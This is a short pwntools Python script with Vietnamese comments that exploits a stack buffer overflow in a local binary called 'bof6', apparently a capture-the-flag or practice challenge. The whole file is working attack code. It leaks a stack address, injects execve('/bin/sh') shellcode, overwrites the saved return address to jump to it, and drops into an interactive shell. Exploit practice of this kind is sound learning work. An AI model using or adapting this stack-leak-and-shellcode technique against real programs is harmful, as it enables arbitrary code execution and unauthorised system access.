from pwn import*
exe = ELF('./bof6',checksec = False)
p = process(exe.path)

#Stage 1: Leak stack addr
p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',b'a'*0x50)
p.recvuntil(b'a'*0x50) #Recv đến hết chuỗi nhập vào
stack_leak = u64(p.recv(6) + b'\x00\x00') #Recv 6 byte của địa chỉ stack_leak | vì địa chỉ để sử dụng u64 là 8 byte nên ta nhận thêm 2 byte null
log.info('Stack leak: '+hex(stack_leak)) #In stack_leak
 
input()
#Stage 2: Input shellcode & Get shell
shellcode = asm(
        '''
        mov rbx, 29400045130965551
        push rbx

        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
        ''',arch = 'amd64')
payload = shellcode
payload = payload.ljust(536 - 16) #Tự động đếm shellcode có bao nhiêu byte và thêm kí tự cho đủ yêu cầu
payload += p64(stack_leak - 0x220) #overwrite saved rip | phải trừ đi vì mục tiêu ta là ret vào con trỏ chứa địa chỉ shellcode ljust trừ đi 16 byte vì 16 byte đó sẽ vô tình overwrit saved rip
p.sendlineafter(b'> ',b'2')
p.sendafter(b'> ',payload)

p.interactive()
